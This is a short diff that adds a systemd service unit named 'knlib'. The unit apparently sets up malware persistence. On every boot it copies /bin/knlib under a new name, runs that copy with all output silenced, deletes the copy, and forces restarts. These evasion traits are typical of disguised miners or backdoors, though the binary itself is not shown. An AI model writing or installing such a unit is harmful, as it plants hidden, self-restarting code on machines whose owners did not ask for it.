@@ -1,0 +1,14 @@
+[Unit]
+Description=knlib
+Wants=network.target
+After=syslog.target network-online.target
+
+[Service]
+Type=forking
+ExecStart=/bin/bash -c 'cp -f -r -- /bin/knlib /bin/klibsystem4 2>/dev/null && /bin/klibsystem4 >/dev/null 2>&1 && rm -rf -- /bin/klibsystem4 2>/dev/null'
+Restart=always
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
+Default-Start=2 3 4 5
